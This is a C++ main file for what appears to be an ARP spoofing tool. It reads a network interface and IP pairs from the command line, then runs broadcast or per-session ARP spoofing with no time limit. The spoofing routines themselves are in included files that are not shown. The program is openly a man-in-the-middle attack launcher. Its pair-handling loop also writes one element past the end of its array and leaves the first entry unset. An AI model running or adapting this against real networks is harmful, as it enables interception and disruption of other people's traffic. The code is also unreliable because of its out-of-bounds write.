#include <iostream>
#include <vector>
#include "network/NetTools.cpp"
#include "network/NetFuncs.cpp"
#include "network/arp/SessionARPSpoofing.cpp"
#include "network/arp/BroadcastARPSpoofing.cpp"

int main(int argc, char* argv[]) {
    if (argc < 2) {
        std::cout << "WARNING: failed load network protocol..." << std::endl;
        return 1;
    } else std::cout << "INFO: network interface at " << argv[1] << std::endl;

    ARPSpoofingManager* arpSpoofingManager;

    if (argc == 2) {
        std::cout << "INFO: broadcast ARP-Spoofing..." << std::endl;
        arpSpoofingManager = new BroadcastARPSpoofing(argv[1]);
    } else {
        int pair_count = argc / 2 - 1;
        std::cout << "INFO: total session: " << pair_count << std::endl;
        auto pairs = new std::pair<uint8_t *, uint8_t *>[pair_count]();
        for (int i = 1; pair_count + 1 > i; i++) {
            auto senderIP = NetTools::strToIP(argv[i * 2]);
            auto targetIp = NetTools::strToIP(argv[i * 2 + 1]);
            if (!senderIP or !targetIp) {
                std::cout << "WARNING: invalid session pair: " << argv[i * 2] << " <=> " << argv[i * 2 + 1]
                          << std::endl;
                return 1;
            }
            std::cout << "INFO: success add session: " << argv[i * 2] << "<=>" << argv[i * 2 + 1] << std::endl;
            pairs[i] = std::make_pair(senderIP.value(), targetIp.value());
        }
        arpSpoofingManager = new SessionARPSpoofing(argv[1], pairs);
    }

    arpSpoofingManager->buildSessions();
    arpSpoofingManager->startARPSpoofing(ARPSpoofingManager::UNLIMITED);
    return 0;
}
